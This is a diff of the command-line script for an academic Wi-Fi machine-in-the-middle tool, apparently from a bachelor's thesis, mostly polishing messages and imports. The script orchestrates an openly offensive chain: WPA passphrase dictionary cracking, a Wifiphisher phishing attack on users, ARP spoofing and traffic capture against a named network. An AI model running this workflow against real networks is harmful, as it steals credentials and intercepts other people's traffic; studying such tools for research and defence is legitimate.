@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-WiFi Machine-in-the-Middle - command line interface
+Wi-Fi Machine-in-the-Middle - command line interface
 
 Automation of MitM Attack on WiFi Networks
 Bachelor's Thesis UIFS FIT VUT
@@ -15,22 +15,22 @@ import tempfile
 import time
 import warnings
 from enum import Enum, unique
+from typing import BinaryIO
 from typing import Optional, Sequence
 
 import coloredlogs
-import setuptools_scm
 
-from wifimitm.access import WirelessUnlocker, WirelessConnecter, list_wifi_interfaces
-from wifimitm.capture import Dumpcap
-from wifimitm.common import WirelessScanner
-from wifimitm.impersonation import Wifiphisher
-from wifimitm.model import WirelessAccessPoint
-from wifimitm.model import WirelessInterface
-from wifimitm.requirements import Requirements, RequirementError, UidRequirement
-from wifimitm.topology import ArpSpoofing
-from wifimitm.wpa2 import verify_psk, PassphraseNotInAnyDictionaryError
+from .access import WirelessUnlocker, WirelessConnecter, list_wifi_interfaces
+from .capture import Dumpcap
+from .common import WirelessScanner
+from .impersonation import Wifiphisher
+from .model import WirelessAccessPoint
+from .model import WirelessInterface
+from .requirements import Requirements, RequirementError, UidRequirement
+from .topology import ArpSpoofing
+from .wpa2 import verify_psk, PassphraseNotInAnyDictionaryError
 
-__version__ = setuptools_scm.get_version()
+__version__ = '0.3'
 __author__ = 'Martin Vondracek'
 __email__ = 'xvondr20@stud.fit.vutbr.cz'
 
@@ -44,31 +44,31 @@ class ExitCode(Enum):
     Some are inspired by sysexits.h.
     """
     EX_OK = 0
-    """successful termination"""
+    """Program terminated successfully."""
 
     ARGUMENTS = 2
-    """incorrect or missing program arguments"""
+    """Incorrect or missing arguments provided."""
 
     EX_UNAVAILABLE = 69
-    """required program or file does not exist"""
+    """Required program or file does not exist."""
 
     EX_NOPERM = 77
-    """permission denied"""
+    """Permission denied."""
 
     TARGET_AP_NOT_FOUND = 79
-    """target AP was not found during scan"""
+    """Target AP was not found during scan."""
 
-    PASSPHRASE_NOT_IN_DICTIONARY = 80
-    """WPA/WPA2 passphrase was not found in available dictionary/dictionaries"""
+    NOT_IN_ANY_DICTIONARY = 80
+    """WPA/WPA2 passphrase was not found in any available dictionary."""
 
     PHISHING_INCORRECT_PSK = 81
-    """WPA/WPA2 passphrase obtained from phishing attack is incorrect"""
+    """WPA/WPA2 passphrase obtained from phishing attack is incorrect."""
 
     SUBPROCESS_ERROR = 82
-    """Failure in subprocess."""
+    """Failure in subprocess occured."""
 
     KEYBOARD_INTERRUPT = 130
-    """received KeyboardInterrupt, SIGINT"""
+    """Program received SIGINT."""
 
 
 def main():
@@ -81,10 +81,10 @@ def main():
         coloredlogs.install(level=config.logging_level)
     else:
         logging.disable(logging.CRITICAL)
-    logger.info('config parsed from args')
+    logger.info('Config parsed from args.')
     logger.debug(str(config))
 
-    logger.info('check all requirements')
+    logger.info('Check all requirements.')
     try:
         Requirements.check_all()
     except RequirementError as e:
@@ -97,6 +97,7 @@ def main():
         config.cleanup()
         return exitcode.value
 
+    # start successful
     print(config.PROGRAM_DESCRIPTION)
 
     interface = config.interface
@@ -104,8 +105,8 @@ def main():
     with tempfile.TemporaryDirectory() as tmp_dirname:
         interface.start_monitor_mode()
 
-        scanner = WirelessScanner(tmp_dir=tmp_dirname, interface=interface.name)
-        print('scan')
+        scanner = WirelessScanner(tmp_dir=tmp_dirname, interface=interface)
+        print('Scanning networks.')
         scan = scanner.scan_once()
 
         interface.stop_monitor_mode()
@@ -114,29 +115,29 @@ def main():
         for ap in scan:
             if ap.essid == config.essid:
                 target = ap
-                print('target found ' + target.essid)
-                logger.info('target found ' + target.essid)
+                print("Target AP '{}' found.".format(target.essid))
+                logger.info("Target AP '{}' found.".format(target.essid))
                 break
 
         if target:
-            print('AP files @ {}'.format(target.dir_path))
+            print("Attack data stored at '{}'.".format(target.dir_path))
 
             interface.start_monitor_mode(target.channel)
-            wireless_unlocker = WirelessUnlocker(ap=target, if_mon=interface.name)
+            wireless_unlocker = WirelessUnlocker(ap=target, monitoring_interface=interface)
             try:
-                print('unlocking')
+                print('Unlock targeted AP.')
                 wireless_unlocker.start()
             except PassphraseNotInAnyDictionaryError:
                 print('Passphrase not in any dictionary.')
             finally:
                 interface.stop_monitor_mode()
 
-            if not target.is_cracked():
+            if not (target.is_cracked() or 'OPN' in target.encryption):
                 if config.phishing_enabled:
                     # try phishing attack to catch password from users
-                    print('Try to impersonate AP and perform phishing attack.')
+                    print('Try to impersonate AP and perform a phishing attack.')
                     try:
-                        print('start wifiphisher')
+                        print('Start wifiphisher.')
                         with Wifiphisher(ap=target, jamming_interface=interface) as wifiphisher:
                             while not wifiphisher.password:
                                 wifiphisher.update()
@@ -149,7 +150,7 @@ def main():
                                 config.cleanup()
                                 return ExitCode.PHISHING_INCORRECT_PSK.value
                     except KeyboardInterrupt:
-                        print('stopping')
+                        print('Stopping.')
                         config.cleanup()
                         return ExitCode.KEYBOARD_INTERRUPT.value
                     except Wifiphisher.UnexpectedTerminationError:
@@ -160,24 +161,28 @@ def main():
                     print('Phishing is not enabled and targeted AP is not cracked after previous attacks.\n'
                           'Attack unsuccessful.', file=sys.stderr)
                     config.cleanup()
-                    return ExitCode.PASSPHRASE_NOT_IN_DICTIONARY.value
+                    return ExitCode.NOT_IN_ANY_DICTIONARY.value
 
-            print('unlocked')
+            print('Targeted AP unlocked.')
 
-            wireless_connecter = WirelessConnecter(interface=interface.name)
-            print('connecting')
+            # target unlocked, connect to the network
+
+            wireless_connecter = WirelessConnecter(interface=interface)
+            print('Connecting to the AP.')
             wireless_connecter.connect(target)
-            print('connected')
+            print('Connection successful.')
+
+            # change the network topology
 
             arp_spoofing = ArpSpoofing(interface=interface)
-            print('changing topology of network')
+            print('Changing topology of network.')
             arp_spoofing.start()
             print('Running until KeyboardInterrupt.')
             try:
                 dumpcap = None
                 if config.capture_file:
                     dumpcap = Dumpcap(interface=interface, capture_file=config.capture_file)
-                    print('capturing')
+                    print('Capturing network traffic.')
                 try:
                     while True:
                         arp_spoofing.update_state()
@@ -188,13 +193,15 @@ def main():
                     if dumpcap:
                         dumpcap.cleanup()
             except KeyboardInterrupt:
-                print('stopping')
+                print('Stopping.')
             arp_spoofing.stop()
             arp_spoofing.clean()
             wireless_connecter.disconnect()
         else:
-            print('target AP not found during scan', file=sys.stderr)
-            logger.error('target AP not found during scan')
+            print('Target AP not found during scan. Please make sure that you are within the signal reach of'
+                  ' the specified AP and try again.', file=sys.stderr)
+            logger.error('Target AP not found during scan. Please make sure that you are within the signal reach of'
+                         ' the specified AP and try again.')
             config.cleanup()
             return ExitCode.TARGET_AP_NOT_FOUND.value
 
@@ -204,7 +211,7 @@ def main():
 
 class Config:
     PROGRAM_NAME = 'wifimitmcli'
-    PROGRAM_DESCRIPTION = 'WiFi Machine-in-the-Middle - command line interface'
+    PROGRAM_DESCRIPTION = 'Wi-Fi Machine-in-the-Middle command-line interface'
     LOGGING_LEVELS_DICT = {'debug': logging.DEBUG,
                            'warning': logging.WARNING,
                            'info': logging.INFO,
@@ -217,9 +224,8 @@ class Config:
     def __init__(self):
         self.logging_level = None  # type: Optional[int]
         self.phishing_enabled = None  # type: Optional[bool]
-        self.capture_file = None  # type: Optional[BinaryIO]  TODO(xvondr20) Close if dumpcap did not close it.
+        self.capture_file = None  # type: Optional[BinaryIO]
         self.essid = None  # type: Optional[str]
-        # TODO(xvondr20) Implement BSSID arg self.target_bssid = None
         self.interface = None  # type: Optional[WirelessInterface]
 
         self.parser = self.init_parser()  # type: argparse.ArgumentParser
@@ -244,6 +250,7 @@ class Config:
         except ValueError:
             raise argparse.ArgumentTypeError('{} is not a valid interface name'.format(arg))
         else:
+            logger.debug(str(i))
             return i
 
     @classmethod
@@ -274,14 +281,17 @@ class Config:
                             )
         parser.add_argument('-cf', '--capture-file',
                             type=argparse.FileType('wb'),
-                            help='capture network traffic to provided file'
+                            help='capture network traffic to provided file',
+                            metavar='FILE',
                             )
-
-        target_ap = parser.add_argument_group(title='Target AP')
-        target_ap.add_argument('essid', help='essid of network for attack')
+        parser.add_argument('essid',
+                            help='essid of network for attack',
+                            metavar='<essid>',
+                            )
         parser.add_argument('interface',
                             type=cls.parser_type_wireless_interface,
-                            help='wireless network interface for attack'
+                            help='wireless network interface for attack',
+                            metavar='<interface>',
                             )
         return parser
 
@@ -325,7 +335,8 @@ class Config:
         self.interface = parsed_args.interface
 
     def cleanup(self):
-        self.capture_file.close()
+        if self.capture_file:
+            self.capture_file.close()
 
 
 if __name__ == '__main__':
